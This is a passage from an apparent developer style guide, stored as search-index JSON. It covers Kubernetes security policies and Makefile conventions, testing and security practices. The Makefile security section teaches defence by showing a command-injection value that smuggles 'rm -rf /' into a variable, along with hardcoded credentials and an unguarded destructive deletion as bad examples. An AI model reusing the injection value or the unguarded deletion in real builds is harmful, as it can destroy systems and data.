<pre><code>## Bad - Using latest tag from untrusted registry\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  containers:\n  - name: app\n    image: randomuser/myapp:latest  # Untrusted! Unpredictable!\n\n## Good - Pin specific versions from trusted registry\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  containers:\n  - name: app\n    image: gcr.io/mycompany/myapp:v1.2.3@sha256:abc123...  # SHA256 digest\n    imagePullPolicy: Always\n\n## Good - Use private registry with imagePullSecrets\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  imagePullSecrets:\n  - name: regcred\n  containers:\n  - name: app\n    image: myregistry.azurecr.io/myapp:v1.2.3\n\n## Enforce with admission controller\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sAllowedRepos\nmetadata:\n  name: allowed-repositories\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n  parameters:\n    repos:\n    - \"gcr.io/mycompany/\"\n    - \"myregistry.azurecr.io/\"\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#admission-control","title":"Admission Control","text":"<p>Use admission controllers to enforce policies.</p> <pre><code>## OPA Gatekeeper policy - Block privileged containers\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sPSPPrivilegedContainer\nmetadata:\n  name: deny-privileged-containers\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n  parameters:\n    excludedNamespaces:\n    - kube-system\n\n## Block images without digest\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sImageDigests\nmetadata:\n  name: require-image-digest\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n\n## Require labels\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sRequiredLabels\nmetadata:\n  name: require-owner-label\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n  parameters:\n    labels:\n    - key: \"owner\"\n    - key: \"environment\"\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#audit-logging","title":"Audit Logging","text":"<p>Enable comprehensive audit logging.</p> <pre><code>## kube-apiserver audit policy\napiVersion: audit.k8s.io/v1\nkind: Policy\nrules:\n## Log all requests to Secrets\n- level: RequestResponse\n  resources:\n  - group: \"\"\n    resources: [\"secrets\"]\n\n## Log all authentication and authorization failures\n- level: Metadata\n  omitStages:\n  - \"RequestReceived\"\n  userGroups:\n  - \"system:unauthenticated\"\n\n## Log pod exec and port-forward\n- level: Request\n  verbs: [\"create\"]\n  resources:\n  - group: \"\"\n    resources: [\"pods/exec\", \"pods/portforward\"]\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#pod-disruption-budgets","title":"Pod Disruption Budgets","text":"<p>Protect against accidental disruption.</p> <pre><code>## Good - Ensure minimum availability during maintenance\napiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: app-pdb\n  namespace: production\nspec:\n  minAvailable: 2\n  selector:\n    matchLabels:\n      app: critical-app\n\n## Or use percentage\napiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: app-pdb-percent\n  namespace: production\nspec:\n  maxUnavailable: \"25%\"\n  selector:\n    matchLabels:\n      app: web-app\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#references","title":"References","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#official-documentation","title":"Official Documentation","text":"<ul> <li>Kubernetes Documentation</li> <li>Helm Documentation</li> <li>Kubernetes API Reference</li> </ul>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#best-practices","title":"Best Practices","text":"<ul> <li>Kubernetes Best Practices</li> <li>Helm Best Practices</li> <li>12 Factor App</li> </ul>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#tools","title":"Tools","text":"<ul> <li>kubectl - Kubernetes CLI</li> <li>helm - Kubernetes package manager</li> <li>kubeval - Kubernetes manifest validation</li> <li>kube-linter - Static analysis tool</li> <li>kustomize - Template-free customization</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/makefile/","title":"Makefile Style Guide","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#language-overview","title":"Language Overview","text":"<p>Makefiles are used with the <code>make</code> utility to automate build processes, run tests, and execute common tasks. This guide covers Makefile best practices for creating maintainable, portable, and efficient build automation.</p>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>File Name: <code>Makefile</code> or <code>makefile</code> (prefer <code>Makefile</code>)</li> <li>Syntax: Tab-indented commands, target-based execution</li> <li>Primary Use: Build automation, task execution, dependency management</li> <li>Key Concepts: Targets, prerequisites, recipes, variables</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Syntax Indentation TAB character <code>\\tcommand</code> Must use tabs for recipes, not spaces Target Names <code>lowercase</code> or <code>kebab-case</code> <code>build</code>, <code>clean</code>, <code>test-unit</code> Descriptive target names Variables <code>UPPER_CASE</code> <code>CC</code>, <code>CFLAGS</code>, <code>BUILD_DIR</code> Uppercase for variables Phony Targets <code>.PHONY</code> declaration <code>.PHONY: clean test</code> Non-file targets Structure Target <code>target: prerequisites</code> <code>build: compile link</code> Target depends on prerequisites Recipe Tab-indented commands <code>\\t@echo \"Building...\"</code> Commands to execute Variables <code>VAR = value</code> <code>CC = gcc</code> Simple assignment Variables Simple <code>=</code> <code>CC = gcc</code> Recursive expansion Immediate <code>:=</code> <code>BUILD_DIR := ./build</code> Immediate expansion Conditional <code>?=</code> <code>CC ?= gcc</code> Set if not already set Append <code>+=</code> <code>CFLAGS += -Wall</code> Append to variable Special Targets <code>.PHONY</code> Non-file targets <code>.PHONY: clean all test</code> Prevent file conflicts <code>.DEFAULT_GOAL</code> Default target <code>.DEFAULT_GOAL := build</code> Run when no target specified Automatic Variables <code>$@</code> Target name <code>$@</code> Current target <code>$&lt;</code> First prerequisite <code>$&lt;</code> First dependency <code>$^</code> All prerequisites <code>$^</code> All dependencies Best Practices Silent Commands <code>@</code> prefix <code>@echo \"Building...\"</code> Suppress command echo Error Handling <code>-</code> prefix <code>-rm -rf build/</code> Ignore errors Phony Targets Always declare <code>.PHONY: clean test</code> Avoid file name conflicts Help Target Include help <code>help:</code> Document available targets","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#basic-structure","title":"Basic Structure","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#simple-makefile","title":"Simple Makefile","text":"<pre><code>.PHONY: help clean build test\n\nhelp:\n @echo \"Available targets:\"\n @echo \"  build  - Build the application\"\n @echo \"  test   - Run tests\"\n @echo \"  clean  - Clean build artifacts\"\n\nbuild:\n go build -o bin/app main.go\n\ntest:\n go test ./...\n\nclean:\n rm -rf bin/\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#targets-and-prerequisites","title":"Targets and Prerequisites","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#basic-target","title":"Basic Target","text":"<pre><code>## Target: what to build\n## Prerequisites: dependencies\n## Recipe: commands to execute (MUST be indented with TAB)\n\ntarget: prerequisite1 prerequisite2\n command1\n command2\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#target-with-prerequisites","title":"Target with Prerequisites","text":"<pre><code>.PHONY: all build test\n\nall: build test\n\nbuild: compile\n @echo \"Build complete\"\n\ncompile:\n gcc -o myapp main.c\n\ntest: build\n ./myapp --test\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#phony-targets","title":".PHONY Targets","text":"<p>Always declare targets that don't create files as <code>.PHONY</code>:</p> <pre><code>.PHONY: clean test run install help\n\nclean:\n rm -rf build/ dist/\n\ntest:\n pytest tests/\n\nrun:\n python main.py\n\ninstall:\n pip install -r requirements.txt\n\nhelp:\n @echo \"Available targets: clean, test, run, install, help\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#variables","title":"Variables","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#define-variables","title":"Define Variables","text":"<pre><code>## Simple variable\nCC = gcc\nCFLAGS = -Wall -Wextra -O2\n\n## Recursive variable (evaluated when used)\nSRC_DIR = src\nOBJ_DIR = $(SRC_DIR)/obj\n\n## Simply expanded variable (evaluated immediately)\nBUILD_TIME := $(shell date +%Y%m%d-%H%M%S)\n\n## Conditional variable\nDEBUG ?= 0\n\nifeq ($(DEBUG),1)\n    CFLAGS += -g\nendif\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#use-variables","title":"Use Variables","text":"<pre><code>CC = gcc\nCFLAGS = -Wall -Wextra\nSOURCES = main.c utils.c\n\nbuild:\n $(CC) $(CFLAGS) $(SOURCES) -o app\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#common-variables","title":"Common Variables","text":"<pre><code>## Compiler and tools\nCC = gcc\nCXX = g++\nLD = ld\nAR = ar\n\n## Directories\nSRC_DIR = src\nBUILD_DIR = build\nBIN_DIR = bin\n\n## Flags\nCFLAGS = -Wall -Wextra -O2\nLDFLAGS = -L/usr/local/lib\nINCLUDES = -I/usr/local/include\n\n## Files\nSOURCES = $(wildcard $(SRC_DIR)/*.c)\nOBJECTS = $(SOURCES:$(SRC_DIR)/%.c=$(BUILD_DIR)/%.o)\nTARGET = $(BIN_DIR)/app\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#pattern-rules","title":"Pattern Rules","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#basic-pattern-rule","title":"Basic Pattern Rule","text":"<pre><code>## Compile .c files to .o files\n%.o: %.c\n $(CC) $(CFLAGS) -c $&lt; -o $@\n\n## Automatic variables:\n## $@ - target name\n## $&lt; - first prerequisite\n## $^ - all prerequisites\n## $* - stem (matched by %)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#advanced-pattern-rules","title":"Advanced Pattern Rules","text":"<pre><code>SRC_DIR = src\nBUILD_DIR = build\n\n## Pattern rule with directory paths\n$(BUILD_DIR)/%.o: $(SRC_DIR)/%.c\n @mkdir -p $(BUILD_DIR)\n $(CC) $(CFLAGS) -c $&lt; -o $@\n\n## Multiple targets\n%.o %.d: %.c\n $(CC) $(CFLAGS) -c $&lt; -o $@\n $(CC) -MM $(CFLAGS) $&lt; &gt; $*.d\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#common-patterns","title":"Common Patterns","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#nodejs-typescript-project","title":"Node.js / TypeScript Project","text":"<pre><code>.PHONY: help install build test lint clean dev\n\nhelp:\n @echo \"Available targets:\"\n @echo \"  install  - Install dependencies\"\n @echo \"  build    - Build the application\"\n @echo \"  test     - Run tests\"\n @echo \"  lint     - Run linter\"\n @echo \"  clean    - Clean build artifacts\"\n @echo \"  dev      - Start development server\"\n\ninstall:\n npm ci\n\nbuild: install\n npm run build\n\ntest: install\n npm test\n\nlint:\n npm run lint\n\nclean:\n rm -rf node_modules dist build\n\ndev: install\n npm run dev\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#python-project","title":"Python Project","text":"<pre><code>.PHONY: help install test lint format clean venv\n\nPYTHON = python3\nVENV = venv\nVENV_BIN = $(VENV)/bin\n\nhelp:\n @echo \"Available targets:\"\n @echo \"  venv     - Create virtual environment\"\n @echo \"  install  - Install dependencies\"\n @echo \"  test     - Run tests\"\n @echo \"  lint     - Run linter\"\n @echo \"  format   - Format code\"\n @echo \"  clean    - Clean artifacts\"\n\nvenv:\n $(PYTHON) -m venv $(VENV)\n\ninstall: venv\n $(VENV_BIN)/pip install -r requirements.txt\n $(VENV_BIN)/pip install -r requirements-dev.txt\n\ntest: install\n $(VENV_BIN)/pytest tests/\n\nlint: install\n $(VENV_BIN)/flake8 src/ tests/\n $(VENV_BIN)/mypy src/\n\nformat: install\n $(VENV_BIN)/black src/ tests/\n\nclean:\n rm -rf $(VENV) .pytest_cache __pycache__\n find . -type f -name '*.pyc' -delete\n find . -type d -name '__pycache__' -delete\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#go-project","title":"Go Project","text":"<pre><code>.PHONY: help build test lint clean run\n\nBINARY_NAME = myapp\nGO = go\nGOFLAGS = -v\nLDFLAGS = -ldflags=\"-s -w\"\n\nhelp:\n @echo \"Available targets:\"\n @echo \"  build    - Build the application\"\n @echo \"  test     - Run tests\"\n @echo \"  lint     - Run linter\"\n @echo \"  clean    - Clean build artifacts\"\n @echo \"  run      - Run the application\"\n\nbuild:\n $(GO) build $(GOFLAGS) $(LDFLAGS) -o $(BINARY_NAME) .\n\ntest:\n $(GO) test $(GOFLAGS) ./...\n\nlint:\n golangci-lint run\n\nclean:\n rm -f $(BINARY_NAME)\n $(GO) clean\n\nrun: build\n ./$(BINARY_NAME)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#docker-project","title":"Docker Project","text":"<pre><code>.PHONY: help build push run stop clean\n\nIMAGE_NAME = myapp\nIMAGE_TAG = latest\nREGISTRY = docker.io\nFULL_IMAGE = $(REGISTRY)/$(IMAGE_NAME):$(IMAGE_TAG)\n\nhelp:\n @echo \"Available targets:\"\n @echo \"  build    - Build Docker image\"\n @echo \"  push     - Push image to registry\"\n @echo \"  run      - Run container\"\n @echo \"  stop     - Stop container\"\n @echo \"  clean    - Remove image\"\n\nbuild:\n docker build -t $(FULL_IMAGE) .\n\npush: build\n docker push $(FULL_IMAGE)\n\nrun:\n docker run -d -p 8080:8080 --name $(IMAGE_NAME) $(FULL_IMAGE)\n\nstop:\n docker stop $(IMAGE_NAME)\n docker rm $(IMAGE_NAME)\n\nclean:\n docker rmi $(FULL_IMAGE)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#conditional-logic","title":"Conditional Logic","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#if-statements","title":"If Statements","text":"<pre><code>DEBUG ?= 0\n\nifeq ($(DEBUG),1)\n    CFLAGS += -g -DDEBUG\nelse\n    CFLAGS += -O2\nendif\n\n## Check if variable is defined\nifdef VERBOSE\n    Q =\nelse\n    Q = @\nendif\n\nbuild:\n $(Q)echo \"Building...\"\n $(Q)$(CC) $(CFLAGS) -o app main.c\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#os-detection","title":"OS Detection","text":"<pre><code>UNAME_S := $(shell uname -s)\n\nifeq ($(UNAME_S),Linux)\n    PLATFORM = linux\n    LDFLAGS += -lpthread\nendif\nifeq ($(UNAME_S),Darwin)\n    PLATFORM = macos\n    LDFLAGS += -framework CoreFoundation\nendif\nifeq ($(UNAME_S),MINGW64_NT)\n    PLATFORM = windows\n    EXE_EXT = .exe\nendif\n\nbuild:\n @echo \"Building for $(PLATFORM)\"\n $(CC) -o app$(EXE_EXT) main.c $(LDFLAGS)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#functions","title":"Functions","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#built-in-functions","title":"Built-in Functions","text":"<pre><code>## wildcard - Match files\nSOURCES = $(wildcard src/*.c)\n\n## patsubst - Pattern substitution\nOBJECTS = $(patsubst src/%.c,build/%.o,$(SOURCES))\n\n## shell - Execute shell command\nBUILD_DATE = $(shell date +%Y%m%d)\n\n## foreach - Iterate over list\nDIRS = src include lib\nCREATE_DIRS = $(foreach dir,$(DIRS),$(shell mkdir -p $(dir)))\n\n## filter - Filter list\nCFILES = $(filter %.c,$(SOURCES))\n\n## filter-out - Exclude from list\nNON_TEST = $(filter-out %_test.c,$(SOURCES))\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#multi-line-commands","title":"Multi-Line Commands","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#backslash-continuation","title":"Backslash Continuation","text":"<pre><code>build:\n $(CC) \\\n  $(CFLAGS) \\\n  -I$(INCLUDE_DIR) \\\n  -L$(LIB_DIR) \\\n  $(SOURCES) \\\n  -o $(TARGET)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#multi-line-recipe","title":"Multi-Line Recipe","text":"<pre><code>deploy:\n @echo \"Starting deployment...\"\n @docker build -t myapp:latest .\n @docker tag myapp:latest registry.example.com/myapp:latest\n @docker push registry.example.com/myapp:latest\n @echo \"Deployment complete!\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#error-handling","title":"Error Handling","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#exit-on-error","title":"Exit on Error","text":"<pre><code>## Default: exit on error\ntest:\n pytest tests/\n\n## Continue on error\n.IGNORE: test\ntest:\n pytest tests/\n\n## Ignore errors for specific command\ntest:\n -pytest tests/\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#check-command-success","title":"Check Command Success","text":"<pre><code>test:\n @pytest tests/ || (echo \"Tests failed!\"; exit 1)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#silent-commands","title":"Silent Commands","text":"<pre><code>## Prefix with @ to suppress output\nbuild:\n @echo \"Building...\"\n @$(CC) -o app main.c\n\n## Make all commands silent\n.SILENT:\nbuild:\n echo \"Building...\"\n $(CC) -o app main.c\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#dependencies","title":"Dependencies","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#automatic-dependency-generation","title":"Automatic Dependency Generation","text":"<pre><code>SRC_DIR = src\nBUILD_DIR = build\n\nSOURCES = $(wildcard $(SRC_DIR)/*.c)\nOBJECTS = $(SOURCES:$(SRC_DIR)/%.c=$(BUILD_DIR)/%.o)\nDEPS = $(OBJECTS:.o=.d)\n\n## Include dependency files\n-include $(DEPS)\n\n## Compile with dependency generation\n$(BUILD_DIR)/%.o: $(SRC_DIR)/%.c\n @mkdir -p $(BUILD_DIR)\n $(CC) $(CFLAGS) -MMD -MP -c $&lt; -o $@\n\nbuild: $(OBJECTS)\n $(CC) $(LDFLAGS) $^ -o $(TARGET)\n\nclean:\n rm -rf $(BUILD_DIR) $(TARGET)\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#testing","title":"Testing","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#testing-make-targets","title":"Testing Make Targets","text":"<p>Validate Makefile syntax and targets:</p> <pre><code>## Check Makefile syntax\nmake -n all  # Dry run\n\n## List all targets\nmake -qp | awk -F':' '/^[a-zA-Z0-9][^$#\\/\\t=]*:([^=]|$)/ {split($1,A,/ /);for(i in A)print A[i]}'\n\n## Test specific target without execution\nmake -n build\n\n## Verbose output for debugging\nmake -d build\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-linting","title":"Makefile Linting","text":"<pre><code>## Install checkmake\ngo install github.com/mrtazz/checkmake/cmd/checkmake@latest\n\n## Lint Makefile\ncheckmake Makefile\n\n## With custom config\ncheckmake --config=.checkmake Makefile\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#unit-testing-makefile-targets","title":"Unit Testing Makefile Targets","text":"<pre><code>## tests/makefile_test.sh\n#!/bin/bash\nset -e\n\necho \"Testing Makefile targets...\"\n\n## Test clean target\nmake clean\nif [ -d \"build/\" ]; then\n  echo \"FAIL: clean target did not remove build directory\"\n  exit 1\nfi\necho \"PASS: clean target works\"\n\n## Test build target creates output\nmake build\nif [ ! -f \"build/app\" ]; then\n  echo \"FAIL: build target did not create output\"\n  exit 1\nfi\necho \"PASS: build target works\"\n\n## Test test target runs successfully\nif ! make test; then\n  echo \"FAIL: test target failed\"\n  exit 1\nfi\necho \"PASS: test target works\"\n\necho \"All Makefile tests passed!\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#integration-testing","title":"Integration Testing","text":"<p>Test Make targets in CI/CD:</p> <pre><code>## .github/workflows/makefile-test.yml\nname: Test Makefile\n\non: [push, pull_request]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install dependencies\n        run: make deps\n\n      - name: Lint Makefile\n        run: |\n          go install github.com/mrtazz/checkmake/cmd/checkmake@latest\n          checkmake Makefile\n\n      - name: Test clean target\n        run: |\n          make build\n          make clean\n          test ! -d build/\n\n      - name: Test build\n        run: make build\n\n      - name: Run tests\n        run: make test\n\n      - name: Test install\n        run: make install PREFIX=/tmp/install\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#testing-with-bats","title":"Testing with BATS","text":"<pre><code>## tests/makefile.bats\n#!/usr/bin/env bats\n\n@test \"make clean removes build artifacts\" {\n  make build\n  make clean\n  run test -d build/\n  [ \"$status\" -ne 0 ]\n}\n\n@test \"make build creates binary\" {\n  make clean\n  run make build\n  [ \"$status\" -eq 0 ]\n  [ -f \"build/app\" ]\n}\n\n@test \"make test runs successfully\" {\n  run make test\n  [ \"$status\" -eq 0 ]\n}\n\n@test \"make with no target runs default\" {\n  run make\n  [ \"$status\" -eq 0 ]\n}\n\n@test \"make help displays help text\" {\n  run make help\n  [ \"$status\" -eq 0 ]\n  [[ \"$output\" =~ \"Available targets:\" ]]\n}\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#testing-phony-targets","title":"Testing Phony Targets","text":"<p>Ensure phony targets work correctly:</p> <pre><code>## Makefile\n.PHONY: test-phony\ntest-phony:\n        @echo \"Testing phony targets...\"\n        @$(MAKE) clean\n        @$(MAKE) build\n        @$(MAKE) test\n        @echo \"All phony targets work correctly\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#testing-variable-expansion","title":"Testing Variable Expansion","text":"<pre><code>## Test variable substitution\nmake print-vars\n\n## Test with overridden variables\nmake VAR=value print-vars\n\n## Verify variable defaults\nmake -p | grep \"^VAR =\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#performance-testing","title":"Performance Testing","text":"<p>Test build performance:</p> <pre><code>## Makefile\n.PHONY: benchmark\nbenchmark:\n        @echo \"Benchmarking build...\"\n        @time $(MAKE) clean\n        @time $(MAKE) build\n        @time $(MAKE) test\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#parallel-execution-testing","title":"Parallel Execution Testing","text":"<pre><code>## Test parallel builds\nmake -j4 all\n\n## Verify parallel safety\nmake clean\nmake -j8 build test\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#dependency-testing","title":"Dependency Testing","text":"<p>Verify target dependencies:</p> <pre><code>.PHONY: test-deps\ntest-deps: build test\n        @echo \"Dependencies resolved correctly\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#testing-cross-platform-compatibility","title":"Testing Cross-Platform Compatibility","text":"<pre><code>.PHONY: test-platform\ntest-platform:\nifeq ($(OS),Windows_NT)\n        @echo \"Testing on Windows\"\n        @cmd /c echo Windows test\nelse\n  ifeq ($(shell uname -s),Darwin)\n        @echo \"Testing on macOS\"\n        @echo \"macOS test\"\n  else\n        @echo \"Testing on Linux\"\n        @echo \"Linux test\"\n  endif\nendif\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#error-handling-tests","title":"Error Handling Tests","text":"<pre><code>## Test error propagation\nif make failing-target; then\n  echo \"ERROR: Failed target should have exited with error\"\n  exit 1\nfi\n\n## Test ignore errors\nmake -i potentially-failing-targets\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#security-best-practices","title":"Security Best Practices","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#prevent-command-injection","title":"Prevent Command Injection","text":"<p>Avoid using unsanitized variables in shell commands:</p> <pre><code>## Bad - Vulnerable to command injection\nUSER_INPUT ?= ; rm -rf /\ndeploy:\n ssh server \"cd /app &amp;&amp; deploy $(USER_INPUT)\"  # \u274c Injection risk!\n\n## Good - Validate and quote variables\nUSER_INPUT ?= production\nVALID_ENVS := development staging production\n\ndeploy:\n @if ! echo \"$(VALID_ENVS)\" | grep -wq \"$(USER_INPUT)\"; then \\\n  echo \"Error: Invalid environment '$(USER_INPUT)'\"; \\\n  exit 1; \\\n fi\n ssh server \"cd /app &amp;&amp; deploy '$(USER_INPUT)'\"  # \u2705 Quoted and validated\n\n## Good - Use allow-lists\nDEPLOY_ENV ?= staging\nALLOWED_ENVS := dev staging production\n\ndeploy:\n $(if $(filter $(DEPLOY_ENV),$(ALLOWED_ENVS)),,$(error Invalid environment: $(DEPLOY_ENV)))\n @echo \"Deploying to $(DEPLOY_ENV)\"\n ./deploy.sh \"$(DEPLOY_ENV)\"\n</code></pre> <p>Key Points:</p> <ul> <li>Always validate external inputs</li> <li>Use allow-lists for dynamic values</li> <li>Quote all variables in shell commands</li> <li>Avoid using <code>eval</code> with user input</li> <li>Use <code>$(if)</code> or <code>$(filter)</code> for validation</li> <li>Never trust environment variables directly</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#secure-credentials-management","title":"Secure Credentials Management","text":"<p>Never hardcode credentials in Makefiles:</p> <pre><code>## Bad - Hardcoded credentials\ndeploy:\n aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE  # \u274c Exposed!\n docker login -u myuser -p mypassword  # \u274c Hardcoded!\n\n## Good - Use environment variables\ndeploy:\n @if [ -z \"$$AWS_ACCESS_KEY_ID\" ]; then \\\n  echo \"Error: AWS_ACCESS_KEY_ID not set\"; \\\n  exit 1; \\\n fi\n aws s3 sync ./dist s3://my-bucket\n\n## Good - Read from secure credential stores\ndeploy:\n @echo \"Retrieving credentials from vault...\"\n @$(eval TOKEN := $(shell vault kv get -field=token secret/deploy))\n @curl -H \"Authorization: Bearer $(TOKEN)\" https://api.example.com/deploy\n\n## Good - Use credential files\ndocker-login:\n @if [ ! -f ~/.docker/config.json ]; then \\\n  echo \"Error: Docker credentials not configured\"; \\\n  exit 1; \\\n fi\n docker pull private-registry.com/myapp:latest\n\n## Good - Never log secrets\nDB_PASSWORD := $(shell vault kv get -field=password secret/database)\n\n.SILENT: db-connect\ndb-connect:\n psql -h db.example.com -U admin  # Password from PGPASSWORD env var\n</code></pre> <p>Key Points:</p> <ul> <li>Store secrets in environment variables or vaults</li> <li>Use <code>.SILENT</code> to prevent echoing sensitive commands</li> <li>Read credentials from secure stores (Vault, AWS Secrets Manager)</li> <li>Never commit secrets to version control</li> <li>Use <code>.env</code> files (gitignored) for local development</li> <li>Rotate credentials regularly</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#safe-file-operations","title":"Safe File Operations","text":"<p>Prevent accidental data loss and security issues:</p> <pre><code>## Bad - Dangerous file operations\nclean:\n rm -rf $(BUILD_DIR)/*  # \u274c What if BUILD_DIR is empty or /\n\n## Good - Validate before destructive operations\nBUILD_DIR ?= ./build\n\nclean:\n @if [ -z \"$(BUILD_DIR)\" ] || [ \"$(BUILD_DIR)\" = \"/\" ]; then \\\n  echo \"Error: Invalid BUILD_DIR\"; \\\n  exit 1; \\\n fi\n @if [ -d \"$(BUILD_DIR)\" ]; then \\\n  echo \"Cleaning $(BUILD_DIR)...\"; \\\n  rm -rf \"$(BUILD_DIR)\"/*; \\\n fi\n\n## Good - Use temporary directories safely\nTMP_DIR := $(shell mktemp -d)\n\nbuild-temp:\n @echo \"Using temporary directory: $(TMP_DIR)\"\n cd \"$(TMP_DIR)\" &amp;&amp; build.sh\n cp \"$(TMP_DIR)\"/output ./\n rm -rf \"$(TMP_DIR)\"\n\n## Good - Set safe permissions\ninstall:\n install -m 755 -o root -g root bin/myapp /usr/local/bin/myapp\n install -m 644 -o root -g root config/app.conf /etc/myapp/app.conf\n install -m 600 -o root -g root secrets/api.key /etc/myapp/api.key  # Restrictive\n\n## Good - Verify file integrity\ndownload-verify:\n wget https://example.com/tool.tar.gz\n @echo \"$(EXPECTED_CHECKSUM)  tool.tar.gz\" | sha256sum -c || \\\n  (echo \"Checksum verification failed!\"; rm tool.tar.gz; exit 1)\n tar -xzf tool.tar.gz\n</code></pre> <p>Key Points:</p> <ul> <li>Always validate paths before destructive operations</li> <li>Use <code>mktemp</code> for temporary files/directories</li> <li>Set appropriate file permissions (least privilege)</li> <li>Verify checksums for downloaded files</li> <li>Never use wildcards with <code>rm -rf</code></li> <li>Clean up temporary files in error conditions</li> 